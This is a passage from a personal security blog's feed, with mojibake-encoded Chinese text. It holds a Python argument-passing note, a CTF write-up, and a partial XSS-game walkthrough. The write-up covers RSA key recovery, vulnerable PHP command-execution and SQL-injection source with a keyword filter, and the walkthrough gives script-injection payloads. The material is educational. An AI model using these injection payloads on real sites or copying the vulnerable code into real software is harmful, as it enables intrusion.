ä¼šå‘ç°ï¼Œä»–é‡æ–°å¼€è¾Ÿäº†ä¸€ä¸ªæ–°çš„ç©ºé—´å»å®¹çº³æ–°çš„å€¼ï¼ŒåŸæ¥ä¼ è¿›å»çš„å‚æ•°æ²¡æœ‰å­˜åœ¨ä»»ä½•å½±å“ï¼Œè„‘è¡¥ä¸€ä¸‹è¿™ä¸ªå›¾ï¼Œç°åœ¨å˜æˆäº†è¿™æ ·ï¼Œè·Ÿå¹³å¸¸çš„å¼•ç”¨æ˜¯ä¸æ˜¯æœ‰ç‚¹ä¸ä¸€æ ·ã€‚</p><p><img src="https://s2.ax1x.com/2019/04/14/AOHK5q.png" alt="AOHK5q.png"></p><p>å†æ¥çœ‹è¿™æ ·ä¸€æ®µä»£ç ï¼Œä»¥é˜Ÿåˆ—ä¸ºä¾‹ï¼Œç„¶åå¯¹ä¼ è¿›çš„é˜Ÿåˆ—åšä¿®æ”¹ï¼Œå†è§‚å¯Ÿä¸€ä¸‹åœ°å€å†…å®¹çš„æ”¹å˜ï¼ŒæŸ¥çœ‹å…¶æ˜¯å¦ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        self.page_queue.put(<span class="number">1</span>)   <span class="comment">#å¢åŠ ä¸€ä¸ªå€¼</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue.empty())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    page_queue = Queue(<span class="number">100</span>)</span><br><span class="line">    print(id(page_queue))</span><br><span class="line">    print(page_queue.empty())</span><br><span class="line">    c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1519902231520</span><br><span class="line">True</span><br><span class="line">1519902231520</span><br><span class="line">1519902231520 False</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å€¼å˜åŒ–äº†ï¼Œåœ°å€å´æ²¡å‘ç”Ÿå˜åŒ–ï¼Œæ˜æ˜¾çš„å¼•ç”¨ä¼ å‚çš„ä¾‹å­</p><h4 id="è‡ªå·±çš„å°ç»“"><a href="#è‡ªå·±çš„å°ç»“" class="headerlink" title="è‡ªå·±çš„å°ç»“"></a>è‡ªå·±çš„å°ç»“</h4><p>è¿™é‡Œå°±å¯ä»¥å¯¹ç…§ä¸€ä¸‹ä¸Šé¢ä¸ºä»€ä¹ˆè¯´pythonå¯¹è±¡æœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯å¯å˜çš„ï¼Œå¦å¤–ä¸€ç§æ˜¯ä¸å¯å˜çš„ï¼Œå› ä¸ºåœ¨pythonè¿™ä¸ªè¯­è¨€ä¸­ï¼Œå¯¹äºä¸å¯å˜å¯¹è±¡çš„ä¼ å‚ä¾‹å¦‚(tupleï¼Œæ•°å­—ï¼Œå­—ç¬¦)ä»–ä»¬ä¸€æ—¦å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¼šé‡æ–°åœ¨å †é‡Œé¢åˆ†é…ä½ ä¸€å—ç©ºé—´ï¼Œå»ç»™å˜åŒ–çš„å€¼ï¼Œè¿™ä¹Ÿåœ¨å®è§‚ä¸Šç»™äººä¸€ç§æŒ‰å€¼ä¼ é€’çš„é”™è§‰ï¼Œä½†æ˜¯è¿™æ ·çš„æœºåˆ¶ä¹Ÿä¼˜åŒ–äº†pythonçš„è¿è¡Œï¼Œå¯¹äºå¯å˜çš„å¯¹è±¡çš„ä¼ å‚ä¾‹å¦‚(listï¼Œdictï¼Œè¿˜æœ‰ä¸Šé¢æåŠåˆ°çš„queueç±»)ç›¸å½“äºé€šè¿‡æŒ‰å¼•ç”¨æ¥ä¼ é€’å¯¹è±¡ã€‚</p><p>å†™ä»£ç çš„æ—¶å€™æ‰å‘ç°è‡ªå·±æœ‰å¤šèœ2333333ï¼Œå¤§ä½¬ä»¬è¯·å¿½ç•¥</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;äººæ€»æœ‰ä¸ä¼šçš„ï¼Œé‡åˆ°ä¸€äº›é—®é¢˜æ·±ç©¶ä¸‹å»å¿…å®šæœ‰æ‰€æ”¶è·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™ä¸ªé—®é¢˜æ˜¯åœ¨æˆ‘å†™pythonçˆ¬è™«é¡¹ç›®çš„æ—¶å€™çš„ç–‘é—®ï¼Œå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†(ä»¥å‰æ²¡å­¦é€å½»)ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸Šå­¦æœŸå­¦Javaçš„æ—¶å€™æŒ‰å€¼ä¼ é€’çš„ç‰¹ç‚¹ç»™ææ··äº†ï¼Œå› ä¸ºå½“æ—¶åœ¨ç”¨å¤šçº¿ç¨‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜å¤„ç†èµ„æºé˜Ÿåˆ—ï¼Œå‚è€ƒåˆ«äººä»£ç çš„æ—¶å€™çªç„¶è’™äº†ä¸€ä¸‹
    
    </summary>
    
      <category term="python" scheme="0verwatch.top/categories/python/"/>
    
    
      <category term="python" scheme="0verwatch.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>å‘¨å‘¨ç»ƒè¥¿æ¹–è®ºå‰‘ç‰¹åˆ«ç‰ˆ(éƒ¨åˆ†wp)</title>
    <link href="0verwatch.top/week-practice-anheng.html"/>
    <id>0verwatch.top/week-practice-anheng.html</id>
    <published>2019-03-31T08:47:32.000Z</published>
    <updated>2019-04-14T09:21:30.451Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ä¹ æ•°å­¦å¤ä¹ åˆ°åï¼Œç»“æœåˆè¯´æ¨è¿Ÿä¸€ä¸ªæœˆå†è€ƒè¯•ï¼Œå®åœ¨å¯¹æ•°å­¦æä¸äº†å…´è¶£å°±åˆ·åˆ·é¢˜ï¼Œåˆæ¥æ°´ä¸€ç¯‡åšå®¢<a id="more"></a>    </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h4><p>è¿™ä¸ªé¢˜æ‰«ä¸ªäºŒç»´ç å°±è¡Œäº†</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>è¿™ä¸ªé¢˜ç›®è¯´ç®¡ç†å‘˜ç™»é™†çš„å¯†ç å°±æ˜¯flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¯¼å‡ºhttpå¯¹è±¡çœ‹ä¸€ä¸‹å‘ç°è¿™å‡ ä¸ªå¯ç–‘çš„url</p><p><a href="https://imgchr.com/i/AruUIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/AruUIO.png" alt="AruUIO.png"></a></p><p>ç‚¹å‡»å¤§å°ä¸º7266å­—èŠ‚çš„é‚£ä¸ªåŒ…ç„¶åè¿½è¸ªæµå°±ä¼šå‘ç°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªpasswordå…³é”®å­—ï¼Œè¿™ä¸ªå°±æ˜¯flag</p><p><img src="https://s2.ax1x.com/2019/03/31/ArussI.png" alt="ArussI.png"></p><h4 id="ç™¾é‡ŒæŒ‘ä¸€"><a href="#ç™¾é‡ŒæŒ‘ä¸€" class="headerlink" title="ç™¾é‡ŒæŒ‘ä¸€"></a>ç™¾é‡ŒæŒ‘ä¸€</h4><p>æˆ‘è®°å¾—è¿™ä¸ªä»¥å‰åšè¿‡ï¼Œå¥½åƒæ˜¯è¦å†™ä¸ªè„šæœ¬æŠŠé‡Œé¢çš„å›¾ç‰‡ç­›é€‰å‡ºæ¥ï¼Œå¤ªè€—ç¥æ²¡æ—¶é—´ä¸åšäº†ï¼Œå¯¼äº†ä¸€ä¸‹å›¾ç‰‡ï¼Œ418å¼ ã€‚ã€‚ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/31/AruIQs.png" alt="AruIQs.png"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Ordinary-keyboard"><a href="#Ordinary-keyboard" class="headerlink" title="Ordinary keyboard"></a>Ordinary keyboard</h4><p>ä¸æ¸…æ¥šé¢˜ç›®è·Ÿkeyboardæœ‰ä»€ä¹ˆå…³ç³»ï¼Œåæ­£æˆ‘åªèƒ½ä»é¢˜ç›®ä¸­äº†è§£åˆ°å‡ ä¸ªå­—æ¯çš„å¯¹åº”å…³ç³»ï¼Œåæ­£æ•°å­—æ˜¯ä¸å˜çš„ã€‚ã€‚è¿˜æ˜¯ç•™ç‚¹è„‘å­æƒ³é«˜æ•°å§ï¼Œè¿™è„‘æ´çœŸçš„ä¸é€‚åˆæˆ‘</p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>æ­£å¸¸ç±»å‹çš„é¢˜ç›®ï¼Œç»™äº†ä½ å…¬é’¥ï¼Œå…ˆç”¨opensslæŠŠnï¼Œeå¯¼å‡ºæ¥</p><p><img src="https://s2.ax1x.com/2019/03/31/ArK1k8.png" alt="ArK1k8.png"></p><p>ç„¶åè½¬åè¿›åˆ¶nåˆ†è§£</p><p><img src="https://s2.ax1x.com/2019/03/31/ArKamq.png" alt="ArKamq.png"></p><p><img src="https://s2.ax1x.com/2019/03/31/ArKw7V.png" alt="ArKw7V.png"></p><p>æä¸ªä»£ç å†™ä¸ªç§é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">arsa.q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">arsa.e=<span class="number">65537</span></span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="WebScan"><a href="#WebScan" class="headerlink" title="WebScan"></a>WebScan</h4><p>è¿™ä¸ªé¢˜ç›®éƒ½åšäº†å¾ˆå¤šéäº†ï¼Œè¿™é‡Œæ ¹æ®é¢˜æ„å¯ä»¥å»è¯»ä¸€ä¸‹apacheçš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯è¯»å–<code>/etc/httpd/conf/httpd.conf</code>ï¼Œç›´æ¥å°±å‡ºæ¥flagäº†</p><p><img src="https://s2.ax1x.com/2019/03/31/ArM93Q.png" alt="ArM93Q.png"></p><h4 id="åˆ€å¡”"><a href="#åˆ€å¡”" class="headerlink" title="åˆ€å¡”"></a>åˆ€å¡”</h4><p>æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œç»å¯¹æ˜¯æƒ³è€ƒå¯Ÿè¯»å–æ–‡ä»¶ï¼Œçœ‹åˆ°è¿˜æœ‰å‡ ä¸ªæ³¨å…¥å‚æ•°ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯SQLæ³¨å…¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯é¦–å…ˆå¾—ç»•è¿‡ï¼Œå› ä¸ºä»–å¯¹è¿‡æ»¤çš„å­—ç¬¦å›æ˜¾<code>Illegal operation!</code>ï¼Œç„¶åfuzzä¸€ä¸‹çœ‹è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Œå°±çªç„¶å‡ºç°flagäº†ã€‚ã€‚è¿™æ˜¯æ¥æç¬‘çš„ï¼Ÿ(é»‘äººé—®å·)</p><p><img src="https://s2.ax1x.com/2019/03/31/ArML24.png" alt="ArML24.png"></p><p>ç„¶åå›è¿‡å¤´æ¥çœ‹çœ‹è¿™ä¸ªå‡ºé¢˜äººæƒ³å¹²å•¥ï¼Œå‘ç°è¿™ä¸ªç›®å½•ä¸‹è¿˜å­˜åœ¨ä¸€ä¸ª<code>www.zip</code>æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½ä¸‹æ¥ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°flagã€‚ã€‚ã€‚ã€‚è¿™å‡ºé¢˜è¿˜æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿå†æƒ³æƒ³åº”è¯¥æ˜¯å‡ºé¢˜äººåº”è¯¥æ˜¯å¿˜è®°æŠŠflagæ–‡ä»¶å¿˜è®°åˆ é¢ã€‚ã€‚å› ä¸ºæˆ‘çœ‹äº†ä¸‹indexçš„æºç ï¼Œä»–æƒ³è€ƒå¯Ÿçš„åº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡ï¼Œé€šé…ç¬¦ä¹‹ç±»çš„ï¼Œå› ä¸ºä»–ä¸å…è®¸å‡ºç°å­—æ¯å¹¶ä¸”æœ‰é•¿åº¦é™åˆ¶ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">"/[a-zA-Z]/"</span>,$_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">elseif</span>(strlen($_GET[nid])&gt;<span class="number">5</span>)&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;p class=lead&gt;"</span>;</span><br><span class="line">                  system(<span class="string">"head ./news/"</span> . $_GET[<span class="string">'nid'</span>]);</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®è´¨é‡ä¸é«˜ã€‚ã€‚ã€‚</p><h4 id="ç¾ç”·å­"><a href="#ç¾ç”·å­" class="headerlink" title="ç¾ç”·å­"></a>ç¾ç”·å­</h4><p>è¿™ä¸ªé¢˜ç›®ä¸€ä¸Šæ¥æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(is_array($StrValue))</span><br><span class="line">    &#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrtValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"holy shit!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"union|select|from|where|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src='image/img.jpg' /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP;</span></span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query = mysql_query(<span class="string">"SELECT * FROM tb_ctf WHERE key1 = '&#123;$_POST['key1']&#125;'"</span>); </span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'key2'</span>] == $_POST[<span class="string">'key2'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å·¦çœ‹å³çœ‹å‘ç°è¿™å°è¿‡æ»¤æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œè¿™æ ¹æœ¬å°±æ˜¯å®éªŒå§ä¸Šé¢çš„åŸé¢˜å¥½å§ã€‚ã€‚ã€‚è€ƒå¯Ÿçš„æ˜¯with rollupçš„ç‰¹æ€§ï¼Œä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œæ ¹æ®passè¿™ä¸€åˆ—åˆ†ç»„ä½¿ç”¨with rollupä¹‹åä¼šäº§ç”Ÿä¸€ç»„å±æ€§ä¸ºNULLçš„å€¼ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆkey2ä½NULLçš„åŸå› </p><p><img src="https://s2.ax1x.com/2019/03/31/ArQGss.png" alt="ArQGss.png"></p><p>è¿™é‡Œé¦–å…ˆå¾—ç»•è¿‡<code>mysql_num_rows($query) == 1</code>çš„åˆ¤æ–­ï¼Œè¿™å¾ˆå®¹æ˜“ç›´æ¥ä½¿ç”¨<code>or</code>å°±è¡Œä½¿å…¶æ’æˆç«‹ï¼Œå°±ä¼šæ˜¾ç¤º<code>Error</code>è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸè¿›å…¥åˆ¤æ–­äº†</p><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ•°æ®åº“é‡Œé¢æœ‰å¤šå°‘æ•°æ®ï¼Œä¸çŸ¥é“å“ªä¸€æ¡æ˜¯NULLï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>limit offset</code>å»ä¸€æ¡æ¡æµ‹è¯•å°±å¥½ï¼Œæ ¹æ®æˆ‘çš„payloadæ¥çœ‹è¿™æ•°æ®åº“æœ¬åº”è¯¥å°±ä¸€æ¡æ•°æ®ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQBz4.png" alt="ArQBz4.png"></p><p>å°±å†™åˆ°è¿™é‡ŒæŠŠï¼Œçº¯ç²¹å°±æ˜¯æƒ³é€ƒç¦»ä¸€ä¸‹åˆ·é«˜æ•°çš„ææƒ§2333333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¤ä¹ æ•°å­¦å¤ä¹ åˆ°åï¼Œç»“æœåˆè¯´æ¨è¿Ÿä¸€ä¸ªæœˆå†è€ƒè¯•ï¼Œå®åœ¨å¯¹æ•°å­¦æä¸äº†å…´è¶£å°±åˆ·åˆ·é¢˜ï¼Œåˆæ¥æ°´ä¸€ç¯‡åšå®¢
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>xssæ¸¸æˆé€šå…³ç¬”è®°</title>
    <link href="0verwatch.top/xss-game.html"/>
    <id>0verwatch.top/xss-game.html</id>
    <published>2019-03-11T10:59:33.000Z</published>
    <updated>2019-03-11T11:02:53.998Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ç»ƒä¹ xssï¼Œæ„Ÿè§‰è¿™ä¸ªæ¸¸æˆæŒºé€‚åˆæ–°æ‰‹çš„ï¼Œä»ä»£ç å±‚è§’åº¦åˆ†ææ›´åŠ æ·±åˆ»è®¤è¯†xssçš„å½¢æˆï¼Œ<a id="more"></a>å†™äº†ä¸€ä¸‹é€šå…³æ”»ç•¥ï¼Œå¹¶é™„ä¸Šäº†xssæ¼æ´ä½¿ç”¨å·¥å…·å¦‚ä½•å»fuzzã€‚ä»£ç åˆ†äº«ï¼šé“¾æ¥: <a href="https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ" target="_blank" rel="noopener">https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ</a> æå–ç : 2333</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>è¿™ä¸ªé¢˜ç›®å‘ç°urlä¸­æœ‰ä¸€ä¸ªå‚æ•°nameå¯æ§ï¼Œç«‹åˆ»ç”¨<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>æµ‹è¯•æµ‹è¯•ä¸€ä¸‹ï¼Œå¼¹çª—æˆåŠŸï¼Œåœ¨xssä¸­æ‹¥æœ‰åŒæ ·å¼¹çª—æ•ˆæœçš„å‡½æ•°ä¸æ­¢<code>alert</code>ï¼Œè¿˜æœ‰<code>confirm</code>ä»¥åŠ<code>prompt</code></p><p><img src="https://s2.ax1x.com/2019/03/05/kXHE8A.png" alt="kXHE8A.png"></p><p>ä»ä»£ç è§’åº¦å»çœ‹ï¼Œå¯ä»¥å‘ç°å°±æ˜¯ç›´æ¥ç”¨GETæ–¹å¼è·å–å‚æ•°ç„¶åè¾“å‡ºåˆ°æµè§ˆå™¨ä¸Šé¢ï¼Œè¿™æ˜¯å…¸å‹çš„æ²¡åšè¿‡æ»¤ã€‚æ€ä¹ˆé˜²å¾¡ï¼Ÿå¯ä»¥åŠ ä¸€ä¸ªè½¬ä¹‰å‡½æ•°<code>htmlspecialchars</code>æŠŠä¸€äº›htmlæ ¼å¼çš„ä¸œè¥¿ç¼–ç å°±å¯ä»¥æœ‰æ•ˆé˜²æ­¢äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXHmKP.png" alt="kXHmKP.png"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>åŒæ ·çš„å‘ç°urlä¸­<code>keyword</code>å‚æ•°å¯æ§ï¼Œå°è¯•æ¢æµ‹ä¸€æ³¢ï¼Œä½†æ˜¯å‘ç°è¢«è½¬ä¹‰äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kXXbE6.png" alt="kXXbE6.png"></p><p>çŒœæµ‹åº”è¯¥æ˜¯ä½¿ç”¨äº†æˆ‘ä¸Šé¢æ‰€è®²çš„å‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä»£ç </p><p><img src="https://s2.ax1x.com/2019/03/05/kXOvmq.png" alt="kXOvmq.png"></p><p>æˆ‘ä»¬å‘ç°åªæœ‰ä¸€å¤„æ˜¯ä½¿ç”¨äº†è¿™ä¸ªè½¬ä¹‰å‡½æ•°çš„ï¼Œè¿˜æœ‰ä¸€å¤„æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨inputæ ‡ç­¾é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»é—­åˆinputæ ‡ç­¾ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/05/kXX6H0.png" alt="kXX6H0.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>åŒæ ·å…ˆæµ‹è¯•ä¸€ä¸‹çœ‹çœ‹å“ªé‡Œæ˜¯è¾“å…¥ç‚¹ï¼Œå“ªé‡Œæ˜¯è¾“å‡ºç‚¹</p><p><img src="https://s2.ax1x.com/2019/03/05/kXjqLn.png" alt="kXjqLn.png"></p><p>ç„¶åå†ç”¨æœ€ç®€å•çš„è¯­å¥<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°å°–æ‹¬å·è¢«è½¬ä¹‰äº†ï¼Œè€Œä¸”åˆšæ‰åˆ©ç”¨çš„ç‚¹ä¹Ÿè¢«è½¬ä¹‰äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvpz4.png" alt="kXvpz4.png"></p><p>è§‚å¯Ÿä¸€ä¸‹æºç æ˜¯æ€æ ·è¿‡æ»¤çš„ï¼Œå¾ˆæ˜æ˜¾ä¸¤å¤„éƒ½å­˜åœ¨è¿‡æ»¤å‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvKQH.png" alt="kXvKQH.png"></p><p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œé»˜è®¤é…ç½®æ˜¯ä¸è¿‡æ»¤å•å¼•å·çš„ã€‚åªæœ‰è®¾ç½®äº†ï¼š         